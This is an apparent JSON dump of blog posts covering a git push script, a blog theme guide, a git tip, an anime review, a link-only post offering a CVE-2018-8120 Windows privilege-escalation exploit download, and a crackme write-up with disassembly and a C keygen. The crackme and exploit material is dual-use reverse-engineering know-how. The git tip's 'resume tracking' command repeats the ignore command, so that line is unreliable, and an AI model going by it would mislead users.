[{"content":"\n\n\n\n```python\n#!/usr/bin/env python\n\nimport os\nimport subprocess\nimport sys\nimport time\n\ngitconfig = {\n    'cwd': './blog/public',\n    'git': {\n        'github': ['git@github.com:akkuman/akkuman.github.io.git', 'master'],\n        'coding': ['git@git.coding.net:Akkuman/Akkuman.git', 'coding-pages'],\n    }\n}\n\ndef main():\n    global gitconfig\n\n    # change working directory\n    os.chdir(gitconfig.get('cwd', '.'))\n\n    # check if git init\n    if '.git' not in os.listdir():\n        subprocess.check_call(['git', 'init'])\n\n    # check if remote in config, if not, add the remote\n    git_remotes = subprocess.check_output(['git', 'remote', '-v'])\n    git_remotes_str = bytes.decode(git_remotes).strip()\n    git_remotes_list = [line.split()[0] for line in git_remotes_str.split('\\n')]\n    for k,v in gitconfig['git'].items():\n        if k not in git_remotes_list:\n            subprocess.check_call(['git', 'remote', 'add', k, v[0]])\n\n    # add . \u0026 commit with message\n    subprocess.check_call(['git', 'add', '.'])\n    commit_message = 'Site updated: %s' % time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime())\n    if len(sys.argv) == 2:\n        commit_message = sys.argv[1]\n    subprocess.call(['git', 'commit', '-m', commit_message])\n    \n    # push to every remote repo\n    for k,v in gitconfig['git'].items():\n        subprocess.check_call(['git', 'push', k, 'master:%s' % v[1]])\n\nif __name__ == '__main__':\n    if len(sys.argv) == 2:\n        if sys.argv[1] == '-h':\n            print('Usage:\\n\\t%s [commit_message]' % sys.argv[0])\n    main()\n```\n","cover":"","link":"2018/08/22/git-push-python-script.html","preview":"","title":"一键git push脚本(python版)"},{"content":"\n\n\n\n## 主题介绍\n\n为纸小墨写的一款主题,该主题移植自[Yumoe](https://yumoe.com)\n\u003c!--和[Artifact.](https://artifact.me/)--\u003e\n\n### Demo\n[ink-theme-story](https://ink-theme-story.pancakeapps.com)\n\n### 主题的一些食用说明\n\n#### 菜单\n\n标题旁边有一个 · 字符，点击后便可显示菜单。**1**,**2**,**3** 分别代表 **独立页面菜单**、**导航树**(仅在文章界面有用)以及**搜索框**。\n\n具体介绍可见[https://yumoe.com/archives/story.html](https://yumoe.com/archives/story.html)\n\n### 一些功能\n\n- 评论点击加载, 可以应对一些墙导致无法加载的场景\n- 图片懒加载\n- 支持来必力和Disqus评论系统, 默认为Disqus\n- ...\n\n## 主题截图\n![Screenshot_20180820_143859.png](https://i.loli.net/2018/08/20/5b7a62b4ce584.png)\n\n## 使用方法\n\n### 基础设置\n\n进入到纸小墨程序的目录下, 也就是ink主程序的目录, 然后进入该目录下的blog目录\n\n然后执行\n```bash\ngit clone https://github.com/akkuman/ink-theme-story.git\n```\n或者下载git压缩包后解压到blog文件夹\n\n现在你可以看到blog目录下的ink-theme-story目录\n\n然后修改站点配置文件`blog/config.yml`\n\n站点配置文件一般如下: \n\n```yml\nsite:\n    title: \"Akkuman\"\n    subtitle: \"Akkuman的技术博客\"\n    limit: 8\n    theme: ink-theme-story\n    lang: zh\n    url: \"ink-theme-story.pancakeapps.com\"\n    comment: Akkuman\n    logo: \"/images/avatar.png\"\n    # link: \"{category}/{year}/{month}/{day}/{title}.html\"\n    link: \"{year}/{month}/{day}/{title}.html\"\n    # root: \"/blog\"\n\nauthors:\n    me:\n        name: \"Akkuman\"\n        intro: \"编程小白|技术菜鸟\"\n        avatar: \"/images/avatar.png\"\n\nbuild:\n    # output: \"public\"\n    port: 8000\n    # Copied files to public folder when build\n    copy:\n        - \"source/images\"\n    # Excuted command when use 'ink publish'\n    publish: |\n        git add . -A\n        git commit -m \"update\"\n        git push origin\n```\n\n我们需要**修改**的地方有:\n```yml\ntitle   #title字段是截图中的左上角Akkuman字段, 比如我设置为Akkuman那么就是和我截图中一样\nsubtitle    #网站子标题, 在标签页和归档能看到\nlimit: 8    #每页可显示的文章数目, 为了美观建议设置为8\ntheme: ink-theme-story    #网站主题目录, 设置为该主题ink-theme-story\n```\n\n其他地方根据自己需求更改, 纸小墨说明文档见[简洁的静态博客构建工具 —— 纸小墨（InkPaper）](http://www.chole.io/blog/ink-blog-tool.html)\n\n### 关于页面\n\n在纸小墨中,每篇文章是有作者的,我现在按上面我给出的例子配置为例进行说明\n\n纸小墨中每一篇文章的头配置大致如下: \n\n```yml\ntitle: \"简洁的静态博客构建工具 —— 纸小墨（InkPaper）\"\ndate: 2015-03-01 18:00:00 +0800\nupdate: 2016-07-11 17:00:00 +0800\nauthor: me\ncover: \"/images/example.png\"\ntags:\n    - 设计\n    - 写作\npreview: 纸小墨（InkPaper）是一个GO语言编写的开源静态博客构建工具，可以快速搭建博客网站。它无依赖跨平台，配置简单构建快速，注重简洁易用与更优雅的排版。\n```\n\n其中的`preview`是文章预览，也可在正文中使用``分割, 是一个可选字段,我们不必管\n\n对我们有影响的字段配置除了基础的`title`等等之外, 需要关注一下`author`这个字段\n\n纸小墨每一篇文章的作者的关于页面是`about.{{.Author.Id}}.html`, 比如我上面的站点配置文件中`authors`有一个值是`me`, 那么这个作者的关于页面就是`about.me.html`, 也就是我们需要建立一个page, 纸小墨主程序打包中有一个文件`about.me.md`, 可以参见这个文件的格式, 我在这里给出来: \n\n```\ntype: page\ntitle: \"关于作者\"\nauthor: me\n\n---\n\n## 纸小墨\n\n构建只为纯粹书写的博客。\n\n[http://www.chole.io/](http://www.chole.io/)\n```\n\n那么这个文件生成后就会在站点根目录下生成`about.me.html`文件.\n\n**重点来了**\n\n上面我说的关于页面是单个作者的关于页面, 在这个主题中, 我有定义一个站点的关于页面\n\n```html\n\u003ca href=\"{{.Site.Root}}/about.html\"\u003e\u003cli\u003e{{i18n \"about\"}}\u003c/li\u003e\u003c/a\u003e\n```\n\n我们只需要按照上面`about.me.md`的格式新建一个`about.md`即可, 我在这里给出一个`about.md`例子: \n\n```\ntype: page\ntitle: \"关于本站\"\n\n---\n\n我是一个站点关于页面例子 \n```\n\n`author`字段可省略,看自己的喜好\n\n### 评论系统切换\n\n本主题的评论采用点击再动态加载的方式, 所以不用担心因为Disqus被墙的原因导致页面打不开, 只有当你点击`show comments`时才会开始加载评论\n\n本主题支持Disqus和来必力评论系统\n\n切换的话只需要修改站点配置文件`blog/config.yml`, 把`comment`字段的值修改成来必力的`data-uid`(*可在来必力后台代码管理中看到*), 然后打开`blog/ink-theme-story/_comment.html`文件, 把来必力评论的注释去掉, 然后把Disqus评论加上注释即可\n\n## 写在最后\n\n### 致谢\n\n特别感谢[Yumoe](https://yumoe.com)提供了这么简洁大方的主题\n","cover":"","link":"2018/08/22/ink-theme-story.html","preview":"\u003ch2\u003e主题介绍\u003c/h2\u003e\n\n\u003cp\u003e为纸小墨写的一款主题,该主题移植自\u003ca href=\"https://yumoe.com\"\u003eYumoe\u003c/a\u003e\n\u003c!--和[Artifact.](https://artifact.me/)--\u003e\u003c/p\u003e\n\n\u003ch3\u003eDemo\u003c/h3\u003e\n\n\u003cp\u003e\u003ca href=\"https://ink-theme-story.pancakeapps.com\"\u003eink-theme-story\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3\u003e主题的一些食用说明\u003c/h3\u003e\n\n\u003ch4\u003e菜单\u003c/h4\u003e\n\n\u003cp\u003e标题旁边有一个 · 字符，点击后便可显示菜单。\u003cstrong\u003e1\u003c/strong\u003e,\u003cstrong\u003e2\u003c/strong\u003e,\u003cstrong\u003e3\u003c/strong\u003e 分别代表 \u003cstrong\u003e独立页面菜单\u003c/strong\u003e、\u003cstrong\u003e导航树\u003c/strong\u003e(仅在文章界面有用)以及\u003cstrong\u003e搜索框\u003c/strong\u003e。\u003c/p\u003e\n\n\u003cp\u003e具体介绍可见\u003ca href=\"https://yumoe.com/archives/story.html\"\u003ehttps://yumoe.com/archives/story.html\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3\u003e一些功能\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003e评论点击加载, 可以应对一些墙导致无法加载的场景\u003c/li\u003e\n\u003cli\u003e图片懒加载\u003c/li\u003e\n\u003cli\u003e支持来必力和Disqus评论系统, 默认为Disqus\u003c/li\u003e\n\u003cli\u003e\u0026hellip;\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2\u003e主题截图\u003c/h2\u003e\n\n\u003cp\u003e\u003cimg src=\"data:image/gif;base64,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\" data-src=\"https://i.loli.net/2018/08/20/5b7a62b4ce584.png\" alt=\"Screenshot_20180820_143859.png\" /\u003e\u003c/p\u003e\n\n\u003ch2\u003e使用方法\u003c/h2\u003e\n\n\u003ch3\u003e基础设置\u003c/h3\u003e\n\n\u003cp\u003e进入到纸小墨程序的目录下, 也就是ink主程序的目录, 然后进入该目录下的blog目录\u003c/p\u003e\n\n\u003cp\u003e然后执行\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003egit clone https://github.com/akkuman/ink-theme-story.git\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e或者下载git压缩包后解压到blog文件夹\u003c/p\u003e\n\n\u003cp\u003e现在你可以看到blog目录下的ink-theme-story目录\u003c/p\u003e\n\n\u003cp\u003e然后修改站点配置文件\u003ccode\u003eblog/config.yml\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e站点配置文件一般如下:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-yml\"\u003esite:\n    title: \u0026quot;Akkuman\u0026quot;\n    subtitle: \u0026quot;Akkuman的技术博客\u0026quot;\n    limit: 8\n    theme: ink-theme-story\n    lang: zh\n    url: \u0026quot;ink-theme-story.pancakeapps.com\u0026quot;\n    comment: Akkuman\n    logo: \u0026quot;/images/avatar.png\u0026quot;\n    # link: \u0026quot;{category}/{year}/{month}/{day}/{title}.html\u0026quot;\n    link: \u0026quot;{year}/{month}/{day}/{title}.html\u0026quot;\n    # root: \u0026quot;/blog\u0026quot;\n\nauthors:\n    me:\n        name: \u0026quot;Akkuman\u0026quot;\n        intro: \u0026quot;编程小白|技术菜鸟\u0026quot;\n        avatar: \u0026quot;/images/avatar.png\u0026quot;\n\nbuild:\n    # output: \u0026quot;public\u0026quot;\n    port: 8000\n    # Copied files to public folder when build\n    copy:\n        - \u0026quot;source/images\u0026quot;\n    # Excuted command when use 'ink publish'\n    publish: |\n        git add . -A\n        git commit -m \u0026quot;update\u0026quot;\n        git push origin\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e我们需要\u003cstrong\u003e修改\u003c/strong\u003e的地方有:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-yml\"\u003etitle   #title字段是截图中的左上角Akkuman字段, 比如我设置为Akkuman那么就是和我截图中一样\nsubtitle    #网站子标题, 在标签页和归档能看到\nlimit: 8    #每页可显示的文章数目, 为了美观建议设置为8\ntheme: ink-theme-story    #网站主题目录, 设置为该主题ink-theme-story\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e其他地方根据自己需求更改, 纸小墨说明文档见\u003ca href=\"http://www.chole.io/blog/ink-blog-tool.html\"\u003e简洁的静态博客构建工具 —— 纸小墨（InkPaper）\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3\u003e关于页面\u003c/h3\u003e\n\n\u003cp\u003e在纸小墨中,每篇文章是有作者的,我现在按上面我给出的例子配置为例进行说明\u003c/p\u003e\n\n\u003cp\u003e纸小墨中每一篇文章的头配置大致如下:\u003c/p\u003e\n\n\u003cpre\u003e\u003ccode class=\"language-yml\"\u003etitle: \u0026quot;简洁的静态博客构建工具 —— 纸小墨（InkPaper）\u0026quot;\ndate: 2015-03-01 18:00:00 +0800\nupdate: 2016-07-11 17:00:00 +0800\nauthor: me\ncover: \u0026quot;/images/example.png\u0026quot;\ntags:\n    - 设计\n    - 写作\npreview: 纸小墨（InkPaper）是一个GO语言编写的开源静态博客构建工具，可以快速搭建博客网站。它无依赖跨平台，配置简单构建快速，注重简洁易用与更优雅的排版。\n\u003c/code\u003e\u003c/pre\u003e\n\n\u003cp\u003e其中的\u003ccode\u003epreview\u003c/code\u003e是文章预览，也可在正文中使用`\u003c/p\u003e\n","title":"纸小墨ink简洁主题story爱上你的故事"},{"content":"\n\n\n\n项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。\n\n- 告诉git**忽略**对已经纳入版本管理的文件 `.classpath` 的修改，git 会一直忽略此文件直到重新告诉 git 可以再次跟踪此文件 `$ git update-index --assume-unchanged .classpath`\n\n- 告诉 git **恢复跟踪** `$ git update-index --assume-unchanged .classpath`\n\n- **查看**当前被忽略的、已经纳入版本库管理的文件：`$ git ls-files -v | grep -e \"^[hsmrck]\"`\n","cover":"","link":"2018/08/22/git-update-index.html","preview":"","title":"git忽略对已入库文件的修改"},{"content":"\n\n\n\n来源 : [bigric3/cve-2018-8120](https://github.com/bigric3/cve-2018-8120)\n\nDetail : [cve-2018-8120-analysis-and-exploit](http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html)\n\n\n\n## 演示图\n![exploit.gif](https://github.com/bigric3/cve-2018-8120/raw/master/exploit.gif)\n\n## 下载\n[CVE-2018-8120.zip](https://github.com/akkuman/cve-2018-8120/releases)\n","cover":"","link":"2018/05/18/cve-2018-8120.html","preview":"\u003cp\u003e来源 : \u003ca href=\"https://github.com/bigric3/cve-2018-8120\"\u003ebigric3/cve-2018-8120\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eDetail : \u003ca href=\"http://bigric3.blogspot.com/2018/05/cve-2018-8120-analysis-and-exploit.html\"\u003ecve-2018-8120-analysis-and-exploit\u003c/a\u003e\u003c/p\u003e\n","title":"CVE-2018-8120 Windows权限提升"},{"content":"\n\n\n这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。\n\n\n\n莉可的身世原来只是一个可以动的尸体，原来除咒之笼并不能抵抗深渊的诅咒。\n\n其实可以细想，莉可在上升的过程中不断承受诅咒一次次的死亡。\n\n在见到不动卿奥森的时候，奥森告诉了莉可这个残酷的事实，而却没有过多的对莉可心理进行描述，全是描写的奥森和累格，还真是无情呢。\n\n我挺喜欢奥森这个人的，孤傲或者说傲娇。 \n\n在巨人之杯，剧情画风急转而下，莉可的濒死是如此真实。\n\n都说娜娜琪是老婆，其实我觉得娜娜琪这个人物挺可悲的，不是因为他的经历，当然他的经历是一部分，我觉得我觉得他可悲更多是他从来没有为过自己做过什么事情，一直活在期待之中。\n\n另外，我想说一下，娜娜琪不是男孩子吗，为什么是老婆。\n\n下一季应该会碰到黎明卿了，感觉他这个人挺黑暗的，不知道具体怎样。\n\n![860634.png](https://i.loli.net/2018/04/27/5ae3271829c4f.png)\n\n![880846.png](https://i.loli.net/2018/04/27/5ae32734151eb.png)\n","cover":"","link":"2018/04/27/made-in-abyss.html","preview":"\u003cp\u003e这两天把来自深渊补番完了，治愈系？不是，看起来画风确实是这样，但是细看之下其实能感受到故事所描述的残忍与黑暗。\u003c/p\u003e\n","title":"补番完了 来自深渊"},{"content":"\n\n\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1foyrcq7eydj207004jgli.jpg)\n\n\n查壳无壳，vc写的。  \n\n我们输入假码后，然后点击，弹出错误框，直接打开od，对`MessageBoxA`下断点也行，寻找字符串也行。\n\n一般的错误提示部分代码类似于这样。\n```\n    call xxx\n    test xxx,xxx\n    je xxxerror\n    ...\n    jmp xxx\n    push xxx ;xxxerror\n    ...\n\n    call error\n```\n只需要往上找到关键跳直接nop就行。不过我们需要跟踪一下算法。\n\n我们找到关键跳的`call`上方下断，可以看到他把一个东西压栈了，可以猜想是真码。\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1foyroy9x6yj20zm0g1ae2.jpg)\n\n然后我们测试一下111111和1643803416，提示正确，那我们找到这段的段首下断，然后f9运行程序重新输入假码点击Check。重点观察1643803416的出现地。\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1foyrt7stnaj20wx0ecdj6.jpg)\n\n我们可以看到在关键`call`的前方不远处就有出现，那么这个`add`前方的`call`是加密算法`call`吗？\n\n显然不是的，我们可以看到这个`CString::Format`明显是对一个东西进行字符串格式化，格式是`%lu`(无符号长整数)，另外我们可以在它上面Enter跟一跟，可以发现直接从程序领空跳到系统领空了。所以我们可以猜测前面肯定是1643803416的一个什么数学形式然后用`%lu`格式化输出，我们可以推测是16进制，然后我们再重新来注意一下前面。\n\n我们发现了1643803416的十六进制，在上方有个循环。其实之前在f8下来的时候，那个循环我们就可以推测是算法，现在经过分析可以更加肯定了。`mov eax,[local.4]`这个是这个循环最终跳出来的地方，那么`local.4`那里就是我们所需要找的东西。\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1foys1xvfuoj20rb0bwgnu.jpg)\n\n在我们之前的两边跟中，我们可以测试发现`local.7`是你输入的Name的长度，`local.5`是我们输入的名字。\n\n我们把上面的循环好好跟一遍。下面直接看我注释理解吧。对了，我们跟踪过程中也可以发现Name长度不能小于5，就在这个循环上方有个简单的判断。\n\n```\n004015BE  |\u003e \\C745 E0 00000\u003emov [local.8],0x0\n004015C5  |.  EB 09         jmp short Brad_Sob.004015D0\n004015C7  |\u003e  8B55 E0       /mov edx,[local.8]\n004015CA  |.  83C2 01       |add edx,0x1\n004015CD  |.  8955 E0       |mov [local.8],edx                       ;  local8第一次进入循环为0，后续循环每次+1\n004015D0  |\u003e  8B45 E0        mov eax,[local.8]\n004015D3  |.  3B45 E4       |cmp eax,[local.7]                       ;  local7 = len(name)\n004015D6  |.  7D 42         |jge short Brad_Sob.0040161A             ;  当local8\u003e=len(name)跳出循环\n004015D8  |.  8B4D E0       |mov ecx,[local.8]\n004015DB  |.  51            |push ecx\n004015DC  |.  8D4D EC       |lea ecx,[local.5]                       ;  local5=name\n004015DF  |.  E8 1C030000   |call Brad_Sob.00401900                  ;  取name[local8]的十六进制ascii放入al\n004015E4  |.  0FBED0        |movsx edx,al\n004015E7  |.  8B45 F0       |mov eax,[local.4]                       ;  local4初始值为0x81276345\n004015EA  |.  03C2          |add eax,edx\n004015EC  |.  8945 F0       |mov [local.4],eax                       ;  local4 += name[local8]的十六进制\n004015EF  |.  8B4D E0       |mov ecx,[local.8]\n004015F2  |.  C1E1 08       |shl ecx,0x8\n004015F5  |.  8B55 F0       |mov edx,[local.4]\n004015F8  |.  33D1          |xor edx,ecx\n004015FA  |.  8955 F0       |mov [local.4],edx                       ;  local4 = (local8\u003c\u003c8)^local4\n004015FD  |.  8B45 E0       |mov eax,[local.8]\n00401600  |.  83C0 01       |add eax,0x1\n00401603  |.  8B4D E4       |mov ecx,[local.7]\n00401606  |.  0FAF4D E0     |imul ecx,[local.8]\n0040160A  |.  F7D1          |not ecx\n0040160C  |.  0FAFC1        |imul eax,ecx                            ;  eax = (~(len(name)*local8))*(local8+1)\n0040160F  |.  8B55 F0       |mov edx,[local.4]\n00401612  |.  0FAFD0        |imul edx,eax\n00401615  |.  8955 F0       |mov [local.4],edx                       ;  local4 *= eax\n00401618  |.^ EB AD         \\jmp short Brad_Sob.004015C7\n0040161A  |\u003e  8B45 F0       mov eax,[local.4]\n\n```\n\n相信结合我的注释自己细看一遍应该不太费力。下面直接写注册算法。其实上面的基本上用伪代码都写的比较明白了。\n\n```c\n#include \u003cstdio.h\u003e\n#include \u003cstring.h\u003e\n\nint main()\n{\n\t// name为输入的第一个值 \n\tchar* name = \"111111\";\n\tint len_name = strlen(name);\n\t\n\tif (len_name\u003c5)\n\t\t// name小于5出现提示并退出 \n\t\tprintf(\"User Name must have at least 5 characters.\\n\");\n\telse\n\t{\n\t\tlong result = 0x81276345;\n\t\tfor(int i = 0; i \u003c len_name; i++)\n\t\t{\n\t\t\tresult += name[i];\n\t\t\tresult ^= (i\u003c\u003c8);\n\t\t\tresult *= ~(len_name*i)*(i+1);\n\t\t}\n\t\tprintf(\"result: %lu\\n\",result);\n\t}\n\treturn 0;\n}\n```\n","cover":"","link":"2018/03/02/160crackme-019.html","preview":"\u003cp\u003e\u003cimg src=\"data:image/gif;base64,R0lGODlhGAAYAPQAAP///wAAAM7Ozvr6+uDg4LCwsOjo6I6OjsjIyJycnNjY2KioqMDAwPLy8nd3d4aGhri4uGlpaQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkHAAAAIf4aQ3JlYXRlZCB3aXRoIGFqYXhsb2FkLmluZm8AIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAGAAYAAAFriAgjiQAQWVaDgr5POSgkoTDjFE0NoQ8iw8HQZQTDQjDn4jhSABhAAOhoTqSDg7qSUQwxEaEwwFhXHhHgzOA1xshxAnfTzotGRaHglJqkJcaVEqCgyoCBQkJBQKDDXQGDYaIioyOgYSXA36XIgYMBWRzXZoKBQUMmil0lgalLSIClgBpO0g+s26nUWddXyoEDIsACq5SsTMMDIECwUdJPw0Mzsu0qHYkw72bBmozIQAh+QQJBwAAACwAAAAAGAAYAAAFsCAgjiTAMGVaDgR5HKQwqKNxIKPjjFCk0KNXC6ATKSI7oAhxWIhezwhENTCQEoeGCdWIPEgzESGxEIgGBWstEW4QCGGAIJEoxGmGt5ZkgCRQQHkGd2CESoeIIwoMBQUMP4cNeQQGDYuNj4iSb5WJnmeGng0CDGaBlIQEJziHk3sABidDAHBgagButSKvAAoyuHuUYHgCkAZqebw0AgLBQyyzNKO3byNuoSS8x8OfwIchACH5BAkHAAAALAAAAAAYABgAAAW4ICCOJIAgZVoOBJkkpDKoo5EI43GMjNPSokXCINKJCI4HcCRIQEQvqIOhGhBHhUTDhGo4diOZyFAoKEQDxra2mAEgjghOpCgz3LTBIxJ5kgwMBShACREHZ1V4Kg1rS44pBAgMDAg/Sw0GBAQGDZGTlY+YmpyPpSQDiqYiDQoCliqZBqkGAgKIS5kEjQ21VwCyp76dBHiNvz+MR74AqSOdVwbQuo+abppo10ssjdkAnc0rf8vgl8YqIQAh+QQJBwAAACwAAAAAGAAYAAAFrCAgjiQgCGVaDgZZFCQxqKNRKGOSjMjR0qLXTyciHA7AkaLACMIAiwOC1iAxCrMToHHYjWQiA4NBEA0Q1RpWxHg4cMXxNDk4OBxNUkPAQAEXDgllKgMzQA1pSYopBgonCj9JEA8REQ8QjY+RQJOVl4ugoYssBJuMpYYjDQSliwasiQOwNakALKqsqbWvIohFm7V6rQAGP6+JQLlFg7KDQLKJrLjBKbvAor3IKiEAIfkECQcAAAAsAAAAABgAGAAABbUgII4koChlmhokw5DEoI4NQ4xFMQoJO4uuhignMiQWvxGBIQC+AJBEUyUcIRiyE6CR0CllW4HABxBURTUw4nC4FcWo5CDBRpQaCoF7VjgsyCUDYDMNZ0mHdwYEBAaGMwwHDg4HDA2KjI4qkJKUiJ6faJkiA4qAKQkRB3E0i6YpAw8RERAjA4tnBoMApCMQDhFTuySKoSKMJAq6rD4GzASiJYtgi6PUcs9Kew0xh7rNJMqIhYchACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJEAQZZo2JIKQxqCOjWCMDDMqxT2LAgELkBMZCoXfyCBQiFwiRsGpku0EshNgUNAtrYPT0GQVNRBWwSKBMp98P24iISgNDAS4ipGA6JUpA2WAhDR4eWM/CAkHBwkIDYcGiTOLjY+FmZkNlCN3eUoLDmwlDW+AA